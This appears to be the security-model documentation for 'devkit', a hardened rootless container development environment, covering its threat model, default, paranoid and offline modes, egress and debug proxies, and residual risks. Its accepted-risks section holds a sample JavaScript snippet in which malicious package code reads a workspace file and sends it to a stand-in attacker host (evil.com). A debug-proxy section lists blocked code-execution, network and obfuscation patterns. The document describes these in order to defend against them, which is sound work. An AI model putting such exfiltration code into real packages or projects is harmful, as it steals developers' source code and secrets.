# Devkit Security Model

This document describes the security architecture of devkit, including threats that are eliminated, mitigated, and those that remain as accepted risks.

## TL;DR - Security Summary

| Risk Category | Default Mode | Egress Proxy | Paranoid Mode | Notes |
|---------------|--------------|--------------|---------------|-------|
| Host filesystem access | **Eliminated** | **Eliminated** | **Eliminated** | No host mounts |
| Host localhost access | **Eliminated** | **Eliminated** | **Eliminated** | Loopback blocked |
| Privilege escalation | **Eliminated** | **Eliminated** | **Eliminated** | Caps dropped, no-new-privs |
| Malware persistence | **Eliminated** | **Eliminated** | **Eliminated** | Read-only rootfs |
| Remote network attacks | **Eliminated** | **Eliminated** | **Eliminated** | Localhost-only ports |
| Container escape (kernel) | Mitigated | Mitigated | Mitigated | Rootless reduces impact |
| Debug port RCE | Mitigated | Mitigated | **Eliminated** | Disabled in paranoid |
| Data exfiltration | **RISK** | Mitigated | **Eliminated** | Allowlist or air-gap |
| Supply chain (pre-container) | **RISK** | **RISK** | **RISK** | User responsibility |

**Quick reference:**
```bash
devkit start              # Default: secure against most attacks
devkit start --paranoid   # Maximum: air-gapped, no exfiltration possible
devkit start --offline    # Immediate air-gap (no setup network)
# Egress proxy: configure egress_proxy in devkit.yaml
```

---

## Threat Model

Devkit is designed to protect against:

1. **Supply-chain attacks** - Malicious code in npm packages, compromised dependencies
2. **0-day exploits** - Unknown vulnerabilities in project dependencies
3. **Malicious repositories** - Running untrusted code from third-party repos
4. **Data exfiltration** - Unauthorized access to host files, credentials, or services
5. **Lateral movement** - Using the dev environment as a pivot to attack other systems

The primary adversary is **malicious code executing inside the container** that attempts to compromise the host system or exfiltrate sensitive data.

---

## Security Modes

### Default Mode (`devkit start`)

```
┌─────────────────────────────────────────────────────────────────┐
│ HOST SYSTEM                                                     │
│                                                                 │
│  ~/.ssh, ~/.aws, ~/Documents  ──────────────── BLOCKED          │
│  localhost:5432 (postgres)    ──────────────── BLOCKED          │
│  localhost:6379 (redis)       ──────────────── BLOCKED          │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ CONTAINER (rootless, hardened)                            │  │
│  │                                                           │  │
│  │  • No host filesystem access                              │  │
│  │  • No localhost network access                            │  │
│  │  • All capabilities dropped                               │  │
│  │  • Read-only root filesystem                              │  │
│  │  • Privilege escalation blocked                           │  │
│  │                                                           │  │
│  │  Internet ◄─────────────────────────────── ALLOWED        │  │
│  │  (npm registry, github, etc.)                             │  │
│  │                                                           │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  127.0.0.1:2222 (SSH) ◄──────────────────── VS Code connects   │
│  127.0.0.1:9229 (Debug) ◄────────────────── Debugger connects  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Protections enabled:**
- No host filesystem mounts (code cloned via git inside container)
- Host localhost blocked (`slirp4netns:allow_host_loopback=false`)
- All Linux capabilities dropped (`--cap-drop=ALL`)
- Privilege escalation prevented (`--security-opt=no-new-privileges`)
- Read-only root filesystem (`--read-only`)
- Resource limits (4GB RAM, 512 processes)
- Ports bound to 127.0.0.1 only

**Remaining risk:** Outbound internet allows data exfiltration.

---

### Paranoid Mode (`devkit start --paranoid`)

```
┌─────────────────────────────────────────────────────────────────┐
│ HOST SYSTEM                                                     │
│                                                                 │
│  PHASE 1: Setup (temporary)                                     │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ CONTAINER                                                 │  │
│  │  git clone ◄──────────────────────────── github.com       │  │
│  │  npm install ◄────────────────────────── registry.npmjs   │  │
│  └───────────────────────────────────────────────────────────┘  │
│                          │                                      │
│                          ▼ commit & recreate                    │
│                                                                 │
│  PHASE 2: Air-gapped (permanent)                                │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ CONTAINER (air-gapped)                                    │  │
│  │                                                           │  │
│  │  Internet ◄─────────────────────────────── BLOCKED        │  │
│  │  DNS       ◄─────────────────────────────── BLOCKED       │  │
│  │  Everything◄─────────────────────────────── BLOCKED       │  │
│  │                                                           │  │
│  │  Debug port 9229 ────────────────────────── DISABLED      │  │
│  │                                                           │  │
│  │  Dependencies pre-installed, code cloned                  │  │
│  │  Ready for development with ZERO network                  │  │
│  │                                                           │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  127.0.0.1:2222 (SSH) ◄──────────────────── VS Code connects   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Two-phase startup:**

1. **Phase 1 - Setup** (network enabled):
   - Clone git repository
   - Install npm/yarn/pnpm dependencies
   - Container state committed (preserves installed deps)

2. **Phase 2 - Air-gapped** (network disabled):
   - **Podman backend:** Container recreated with `--network=none`
   - **Lima backend:** Container uses bridge network with iptables rules blocking outgoing traffic
   - Debug port disabled
   - Stricter resource limits (2GB RAM, 256 PIDs)
   - **Zero outbound network access** - no exfiltration possible

**Lima-specific implementation:**
The Lima backend cannot use `--network=none` because it would break SSH port forwarding needed for IDE connection. Instead, iptables rules are applied to block all outgoing traffic while preserving incoming SSH:
```bash
iptables -A OUTPUT -o lo -j ACCEPT           # Allow loopback
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT  # Allow responses
iptables -A OUTPUT -j DROP                   # Block all outgoing
```

**Additional protections over default:**
- Complete network isolation after setup (outbound blocked)
- Debug port disabled (eliminates local RCE vector)
- Stricter resource limits
- DNS blocked (no DNS exfiltration)

---

### Offline Mode (`devkit start --offline`)

Starts immediately with `--network=none`. Use when:
- Dependencies are already cached/installed
- Working on previously cloned code
- You don't need any network access

---

## Eliminated Risks

These attack vectors are completely blocked by devkit's architecture.

### 1. Direct Host Filesystem Access

| Threat | Protection | Status |
|--------|------------|--------|
| Read host files (`~/.ssh`, `~/.aws`, etc.) | No host mounts by default | **Eliminated** |
| Write to host filesystem | Named volumes only, no host paths | **Eliminated** |
| Access host `/proc`, `/sys` | Not mounted, rootless namespace | **Eliminated** |
| Traverse to host via symlinks | No host mounts to traverse from | **Eliminated** |

**Implementation:**
```
--volume devkit-workspace:/home/developer/workspace:rw  # Named volume, not host path
--volume devkit-home:/home/developer:rw                 # Named volume, not host path
```

Code is cloned via `git clone` inside the container. The container has no knowledge of or access to host filesystem paths.

### 2. Access to Host Localhost Services

| Threat | Protection | Status |
|--------|------------|--------|
| Connect to host databases (PostgreSQL, MySQL, Redis) | Loopback blocked / VM isolated | **Eliminated** |
| Access host web services (localhost:3000, etc.) | Loopback blocked / VM isolated | **Eliminated** |
| Attack host Docker/Podman socket | Not mounted, loopback blocked | **Eliminated** |
| Connect to host SSH agent | Not forwarded, loopback blocked | **Eliminated** |

**Implementation (Podman):**
```
--network=slirp4netns:allow_host_loopback=false
```

The container's network namespace cannot route to the host's `127.0.0.1`. Attempts to connect to `localhost` or `127.0.0.1` from inside the container will fail.

**Implementation (Lima):**
The container uses bridge networking inside the VM. While the container CAN access the VM's localhost, the VM itself is isolated from the host system. Host services are not accessible because:
- The VM has no mounts to the host filesystem
- The VM's network is NATed through Lima, not bridged to the host
- Host localhost services are not exposed to the VM

### 3. Privilege Escalation via Setuid/Setgid

| Threat | Protection | Status |
|--------|------------|--------|
| Exploit setuid binaries | No-new-privileges flag | **Eliminated** |
| Setgid escalation | No-new-privileges flag | **Eliminated** |
| Capability acquisition | All capabilities dropped | **Eliminated** |

**Implementation:**
```
--security-opt=no-new-privileges    # Podman/nerdctl
--cap-drop=ALL
```

Even if a setuid binary exists in the container, the kernel will ignore the setuid bit. The container starts with zero Linux capabilities and cannot acquire any.

**Note:** Podman uses `no-new-privileges:true` while nerdctl (Lima) uses `no-new-privileges` without the `:true` suffix.

### 4. Persistent Malware in Container

| Threat | Protection | Status |
|--------|------------|--------|
| Trojan installed in system directories | Read-only rootfs | **Eliminated** |
| Modified system binaries | Read-only rootfs | **Eliminated** |
| Cron jobs / systemd services | Read-only rootfs, no init | **Eliminated** |
| Bootkit / rootkit persistence | Read-only rootfs | **Eliminated** |

**Implementation:**
```
--read-only
--tmpfs=/tmp:rw,noexec,nosuid,size=512m
--tmpfs=/run:rw,noexec,nosuid,size=64m
```

The root filesystem is mounted read-only. Writable areas (`/tmp`, `/run`) are tmpfs with `noexec` and `nosuid` flags, preventing execution of dropped binaries.

### 5. External Network Access to Container Services

| Threat | Protection | Status |
|--------|------------|--------|
| Remote attacker connects to SSH | Bound to 127.0.0.1 only | **Eliminated** |
| Remote attacker connects to debug port | Bound to 127.0.0.1 only | **Eliminated** |
| Network scan discovers container | No external port exposure | **Eliminated** |

**Implementation:**
```
--publish 127.0.0.1:2222:22
--publish 127.0.0.1:9229:9229
```

Ports are bound exclusively to the loopback interface. Remote hosts cannot connect to container services, even if they have network access to the host machine.

### 6. Outbound Data Exfiltration (Paranoid Mode Only)

| Threat | Protection | Status |
|--------|------------|--------|
| Send source code to external server | `--network=none` | **Eliminated** (paranoid) |
| Exfiltrate environment variables | `--network=none` | **Eliminated** (paranoid) |
| DNS exfiltration tunnel | `--network=none` | **Eliminated** (paranoid) |
| C2 (command & control) communication | `--network=none` | **Eliminated** (paranoid) |

**Implementation (paranoid mode):**

**Podman backend:**
```
--network=none
```

**Lima backend:**
```bash
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -j DROP
```

In paranoid mode, after initial setup, the container has **zero outbound network access**. No TCP, UDP, ICMP, or DNS traffic can leave the container. Lima uses iptables instead of `--network=none` to preserve SSH port forwarding for IDE connections.

### 7. Egress Proxy (Domain Filtering)

For cases where you need some network access but want to limit which services the container can reach:

| Threat | Without Proxy | With Egress Proxy |
|--------|---------------|-------------------|
| Exfiltrate to arbitrary servers | **RISK** | Blocked (allowlist only) |
| Connect to C2 servers | **RISK** | Blocked |
| Download additional payloads | **RISK** | Blocked (unless in allowlist) |
| Access legitimate APIs | Allowed | Allowed (if in allowlist) |

**Configuration:**
```yaml
# devkit.yaml
security:
  egress_proxy:
    enabled: true
    allowed_hosts:
      - "registry.npmjs.org"
      - "*.github.com"
      - "*.githubusercontent.com"
      - "api.thegraph.com"
    audit_log: true
```

**How it works:**
1. HTTP/HTTPS traffic is routed through a filtering proxy via `HTTP_PROXY`/`HTTPS_PROXY` environment variables
2. Only requests to domains in the allowlist are forwarded
3. All other requests are blocked with HTTP 403
4. Audit logging records all allowed and blocked requests

**Pattern syntax:**
- `example.com` - exact match only
- `*.example.com` - immediate subdomains (api.example.com, but not a.b.example.com)
- `**.example.com` - any depth of subdomains
- `*` - allow everything (disables filtering)

**Security notes:**
- The proxy runs separately from the container, so malicious code cannot bypass it
- Non-HTTP traffic (raw TCP, SSH to external servers) is still subject to standard network mode restrictions
- DNS queries are not filtered (consider using paranoid mode if DNS exfiltration is a concern)

**When to use:**
- Code review that needs API access but shouldn't reach arbitrary servers
- Development that requires specific external services
- Auditing which external services your application contacts

---

## Mitigated Risks

These attack vectors are significantly reduced but not completely eliminated.

### 1. Container Escape via Kernel Vulnerabilities

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| Namespace escape | Rootless containers | User-level access if escaped |
| cgroups vulnerabilities | Rootless + limited capabilities | Reduced attack surface |
| runc/containerd bugs | Rootless, no-new-privileges | User-level access if escaped |

**Why it's mitigated, not eliminated:**

Container isolation depends on kernel features (namespaces, seccomp, cgroups). Historical CVEs include:

| CVE | Description | Devkit Impact |
|-----|-------------|---------------|
| CVE-2024-21626 | runc escape via fd leak | Mitigated by rootless |
| CVE-2022-0492 | cgroups v1 release_agent escape | Mitigated by rootless |
| CVE-2022-0185 | Heap overflow in fs context | Mitigated by dropped caps |
| CVE-2020-15257 | containerd-shim API exposure | Mitigated by rootless |

**Residual risk:** If a kernel-level escape occurs, the attacker gains access as the unprivileged user running Podman. They could then access:
- User's home directory files (`~/.ssh`, `~/.aws`, `~/.gnupg`)
- User's running processes
- User's network connections

**Additional mitigation:** Use Lima backend with per-project VMs for hypervisor-level isolation:
```yaml
runtime:
  backend: lima
  lima:
    per_project_vm: true
```
This provides true double isolation - even if a container escape occurs, the attacker is still confined to a dedicated VM with no access to other projects or the host system.

### 2. Resource Exhaustion (DoS)

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| Fork bomb | `--pids-limit=512` (256 in paranoid) | Limited processes |
| Memory exhaustion | `--memory=4g` (2g in paranoid) | Limited memory |
| Disk exhaustion | Named volumes | Can fill volume (container-local) |
| CPU exhaustion | None by default | Can use 100% CPU |

**Implementation:**
```
--memory=4g
--pids-limit=512
```

**Residual risk:** A malicious process can still consume significant CPU and fill the container's workspace volume. This affects only the container and the user's system responsiveness, not system stability.

**Additional mitigation:** Add `--cpus=2` to limit CPU cores.

### 3. Information Disclosure via Debug Port

| Threat | Default Mode | With Debug Proxy | Paranoid Mode |
|--------|--------------|------------------|---------------|
| Debug port RCE | Mitigated (localhost only) | **Mitigated** (filtered) | **Mitigated** (strict filter) |
| Arbitrary code eval | **RISK** | Filtered/rate-limited | Blocked |
| Command injection | **RISK** | Pattern-blocked | Blocked |

**Default mode residual risk:** The Node.js debug protocol (port 9229) allows arbitrary code execution without authentication. Any process running as the same user on the host can connect to `127.0.0.1:9229` and execute code inside the container.

**Debug proxy mode (`--debug-proxy`):** Traffic is routed through a filtering proxy that:
- Blocks dangerous CDP methods (compileScript, setScriptSource)
- Filters dangerous patterns in evaluate commands (child_process, eval, etc.)
- Rate-limits code execution requests
- Logs all debug activity for audit

**Paranoid mode (`--paranoid`):** Uses debug proxy with strict filtering - blocks ALL evaluate/execute operations. Only allows inspection (breakpoints, step, view variables).

**Manual mitigation:** Use `--no-debug-port` flag to disable entirely.

### 4. SSH Server Attack Surface

| Threat | Mitigation | Residual Risk |
|--------|------------|---------------|
| OpenSSH vulnerabilities | Local-only, key-auth only | Local exploitation possible |
| Brute force attacks | Key authentication only | N/A (passwords disabled) |
| Credential theft | Public key only in container | Private key not exposed |

**Residual risk:** OpenSSH vulnerabilities are rare but do occur. A local attacker (or malware on the host) could potentially exploit the SSH server. Impact is limited to container access.

---

## Remaining Risks (Accepted)

These risks cannot be fully addressed by devkit and require user awareness or external controls.

### 1. Outbound Network Data Exfiltration (Default Mode Only)

> **Note:** This risk is **eliminated** in paranoid mode (`--paranoid`).

| Threat | Default Mode | Paranoid Mode |
|--------|--------------|---------------|
| Send source code to external server | **RISK** | Eliminated |
| Exfiltrate environment variables | **RISK** | Eliminated |
| DNS exfiltration tunnel | **RISK** | Eliminated |
| C2 communication | **RISK** | Eliminated |

**Why it's allowed in default mode:** The container needs network access to:
- Clone git repositories
- Install npm/yarn/pnpm packages
- Fetch remote resources during development

**Attack scenario:**
```javascript
// Malicious code in an npm package
const https = require('https');
const fs = require('fs');

// Steal source code
const code = fs.readFileSync('/home/developer/workspace/src/secret.js');
https.get(`https://evil.com/steal?data=${Buffer.from(code).toString('base64')}`);
```

**Mitigation:** Use `devkit start --paranoid` to air-gap after setup.

### 2. Supply Chain Attacks Before Container

| Threat | Status | Impact |
|--------|--------|--------|
| Compromised base image | **User responsibility** | Full container compromise |
| Malicious git repository | **User responsibility** | Code execution in container |
| npm registry compromise | **User responsibility** | Malicious package execution |
| Typosquatting packages | **User responsibility** | Malicious package execution |

**Why it's accepted:** Devkit cannot verify the legitimacy of:
- Docker/Podman base images
- Git repositories the user chooses to clone
- npm packages the project depends on

**Mitigation options:**

1. **Pin image digests:**
   ```yaml
   dependencies:
     runtime: node@sha256:abc123...  # Immutable reference
   ```

2. **Use verified publishers:**
   - Docker Official Images
   - Signed/verified npm packages

3. **Vendor dependencies:**
   - Commit `node_modules` to repository
   - Use offline mirror of npm registry

4. **Audit before running:**
   ```bash
   npm audit
   ```

### 3. Timing and Side-Channel Attacks

| Threat | Status | Impact |
|--------|--------|--------|
| Spectre/Meltdown | **Kernel dependent** | Cross-container data leak |
| Cache timing attacks | **Allowed** | Cryptographic key extraction |
| Resource timing | **Allowed** | Activity fingerprinting |

**Why it's accepted:** These attacks exploit CPU hardware vulnerabilities that cannot be mitigated purely in software. Container boundaries do not protect against speculative execution attacks.

**Mitigation options:**
- Keep kernel and microcode updated
- Use hardware with mitigations (newer CPUs)
- Run in VM with dedicated CPU cores

### 4. Local User Process Attacks

| Threat | Status | Impact |
|--------|--------|--------|
| Other user processes connect to container | **Allowed** | Via localhost-bound ports |
| Malware on host attacks container | **Allowed** | Via SSH or debug port |

**Why it's accepted:** Devkit protects the host from the container, not the container from the host. If the host is already compromised, the container provides no additional security.

**Mitigation options:**
- Ensure host system is secure
- Use multi-user isolation (different Unix user per project)
- Run in dedicated VM

---

---

## Debug Proxy

The debug proxy is a security middleman that intercepts Chrome DevTools Protocol (CDP) traffic between VS Code and the container. It provides defense-in-depth against malicious code that attempts to exploit the debug interface.

### Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│ HOST                                                                │
│                                                                     │
│  VS Code ──► 127.0.0.1:9229 ──┐                                    │
│                               │                                     │
│  ┌────────────────────────────▼────────────────────────────────┐   │
│  │ DEBUG PROXY CONTAINER                                       │   │
│  │                                                             │   │
│  │  ┌─────────────┐   ┌─────────────┐   ┌─────────────────┐   │   │
│  │  │ WebSocket   │──►│   Filter    │──►│  Audit Logger   │   │   │
│  │  │ Proxy       │   │   Engine    │   │                 │   │   │
│  │  └─────────────┘   └─────────────┘   └─────────────────┘   │   │
│  │         │                                                   │   │
│  │         │ Internal network only                             │   │
│  │         ▼                                                   │   │
│  └─────────┬───────────────────────────────────────────────────┘   │
│            │                                                        │
│  ┌─────────▼───────────────────────────────────────────────────┐   │
│  │ DEV CONTAINER                                               │   │
│  │                                                             │   │
│  │  Debug port 9229 ◄── only reachable from proxy              │   │
│  │                                                             │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Filter Levels

| Level | `Runtime.evaluate` | Dangerous Patterns | Use Case |
|-------|--------------------|--------------------|----------|
| `strict` | **Blocked** | N/A | Untrusted code |
| `filtered` | Rate-limited, filtered | Blocked | Default with proxy |
| `audit` | Allowed (logged) | Allowed (logged) | Trusted code, monitoring |
| `passthrough` | Allowed | Allowed | Debugging proxy issues |

### Blocked Patterns (filtered mode)

The proxy blocks expressions containing:

**Code Execution:**
- `child_process`, `exec`, `spawn`, `fork`
- `eval()`, `Function()`, `vm.runIn*`

**File System Writes:**
- `fs.writeFile`, `fs.unlink`, `fs.rm`

**Network Operations:**
- `require('http')`, `require('net')`
- `fetch()`, `XMLHttpRequest`, `WebSocket`

**Obfuscation:**
- Hex escape sequences (`\x41`)
- Base64 decode (`atob`, `Buffer.from(..., 'base64')`)

### Usage

```bash
# Build the proxy image (one-time)
devkit build --proxy

# Start with proxy filtering
devkit start --debug-proxy

# Start with strict filtering (blocks all evaluate)
devkit start --debug-proxy --proxy-filter=strict

# Paranoid mode includes strict proxy automatically
devkit start --paranoid

# View proxy audit logs
podman logs devkit-myproject-debugproxy

# View proxy statistics
curl http://localhost:9229/stats
```

### Audit Logging

All CDP messages are logged in JSON format:

```json
{"timestamp":"2024-01-15T10:30:00Z","type":"request","method":"Runtime.evaluate","expression":"process.env"}
{"timestamp":"2024-01-15T10:30:01Z","type":"blocked","method":"Runtime.evaluate","reason":"child_process reference blocked"}
```

---

## Security Configuration Reference

### CLI Flags

| Flag | Description | Network | Debug |
|------|-------------|---------|-------|
| (none) | Default secure mode | Restricted | Direct (localhost) |
| `--debug-proxy` | Route debug through filtering proxy | Restricted | Proxied (filtered) |
| `--paranoid` | Maximum security, air-gap + strict proxy | None (after setup) | Proxied (strict) |
| `--offline` | Start with no network immediately | None | Direct (localhost) |
| `--no-debug-port` | Disable debug port entirely | Restricted | Disabled |
| `--proxy-filter=LEVEL` | Set proxy filter level | - | strict/filtered/audit |

### Configuration File

```yaml
# devkit.yaml - Security settings

security:
  # Network isolation level
  # - none: No network access (air-gapped, maximum security)
  # - restricted: Internet allowed, localhost blocked (default)
  # - full: Full network including localhost (dangerous)
  network_mode: restricted

  # Memory limit (prevents OOM attacks on host)
  # Paranoid mode uses 2g
  memory_limit: 4g

  # Maximum number of processes (prevents fork bombs)
  # Paranoid mode uses 256
  pids_limit: 512

  # Read-only root filesystem (prevents persistent malware)
  read_only_rootfs: true

  # Drop all Linux capabilities (minimizes kernel attack surface)
  drop_all_capabilities: true

  # Prevent privilege escalation via setuid binaries
  no_new_privileges: true

  # Disable debug port exposure (e.g., Node.js 9229)
  # Paranoid mode sets this to true
  disable_debug_port: false

features:
  # Allow mounting host directories (breaks filesystem isolation)
  # WARNING: Enables host filesystem access
  allow_mount: false

  # Allow copying files from host (limited exposure)
  allow_copy: false
```

---

## Comparison with Alternatives

| Feature | Devkit (Podman) | Devkit (Lima) | Devkit (paranoid) | Docker (default) | VM |
|---------|-----------------|---------------|-------------------|------------------|-----|
| Host filesystem isolation | ✅ Full | ✅ Full | ✅ Full | ❌ Often mounted | ✅ Full |
| Host localhost isolation | ✅ Blocked | ✅ VM isolated | ✅ Blocked/VM | ❌ Accessible | ✅ Separate |
| Outbound network isolation | ❌ Allowed | ❌ Allowed | ✅ Blocked | ❌ Allowed | Configurable |
| Privilege escalation prevention | ✅ Hardened | ✅ Hardened | ✅ Hardened | ❌ Default caps | ✅ Separate |
| Debug port security | ⚠️ Localhost | ⚠️ Localhost | ✅ Disabled | ⚠️ Varies | N/A |
| Kernel-level isolation | ⚠️ Shared | ✅ Per-project VM | ✅ Per-project VM | ⚠️ Shared | ✅ Separate |
| Performance | ✅ Native | ⚠️ VM overhead | ⚠️ VM overhead | ✅ Native | ⚠️ Overhead |
| Setup complexity | ✅ Simple | ✅ Simple | ✅ Simple | ⚠️ Manual hardening | ⚠️ Complex |
| Container escape impact | ⚠️ User access | ✅ VM confined | ✅ VM confined | ⚠️ User access | ✅ Separate |

**Notes:**
- **Localhost isolation**:
  - **Podman**: Uses `slirp4netns:allow_host_loopback=false` to block container access to host's localhost
  - **Lima**: Container can access VM's localhost, but the VM itself is isolated from the host. Services on the host are not accessible.
- **Rootless containers**: Both Podman and Lima run containers without root privileges. Lima uses rootless containerd/nerdctl inside the VM, providing defense-in-depth (rootless + hypervisor isolation).
- **No host filesystem access (Lima)**: Lima's default mounts (`~`, `/tmp/lima`) are explicitly disabled via `mounts: []`. The VM cannot read or write to host files.

---

## Recommendations by Threat Level

### Standard Development (Trusted Code)
```bash
devkit start
```
- Your own code or well-known, audited dependencies
- Default hardening is sufficient
- Network access needed for ongoing development

### Reviewing Pull Requests / Third-Party Code
```bash
devkit start --paranoid
```
- Code from external contributors
- Dependencies you haven't fully audited
- Automatic air-gap prevents exfiltration

### Running Untrusted Code (Maximum Security)
```bash
# Inside a disposable VM:
devkit start --paranoid
# ... evaluate code ...
devkit stop --remove
```
- Malware samples, security research
- Completely untrusted repositories
- Use VM for hardware-level isolation
- Destroy everything after evaluation

### Quick Iteration (Previously Set Up)
```bash
devkit start --offline
```
- Dependencies already installed
- No network needed
- Maximum isolation from start

---

## Security Checklist

Before running untrusted code:

- [ ] Use `--paranoid` mode or at minimum `--offline`
- [ ] Review `devkit.yaml` for any dangerous overrides
- [ ] Ensure `allow_mount: false` and `allow_copy: false`
- [ ] Consider running inside a VM for kernel-level isolation
- [ ] Run `npm audit` on the codebase first
- [ ] Check for unusual postinstall scripts in package.json
- [ ] Have a plan to destroy the container after evaluation

---

## Reporting Security Issues

If you discover a security vulnerability in devkit, please report it responsibly:

1. **Do not** open a public GitHub issue
2. Email security concerns to the maintainers directly
3. Include steps to reproduce the vulnerability
4. Allow reasonable time for a fix before public disclosure

---

## Changelog

| Version | Security Changes |
|---------|------------------|
| 0.1.0 | Initial security model with hardened defaults |
| 0.2.0 | Added `--paranoid` mode with automatic air-gapping |
| 0.2.0 | Added `--offline` and `--no-debug-port` flags |
| 0.2.0 | Debug port disabled in paranoid mode |
| 0.3.0 | Multi-runtime support with Lima backend |
| 0.3.0 | Per-project VM isolation (hypervisor-level security) |
| 0.3.0 | Two-phase network setup for paranoid mode |
| 0.3.0 | TUI init wizard with port availability checking |
| 0.3.0 | iptables-based air-gapping for Lima (preserves SSH) |
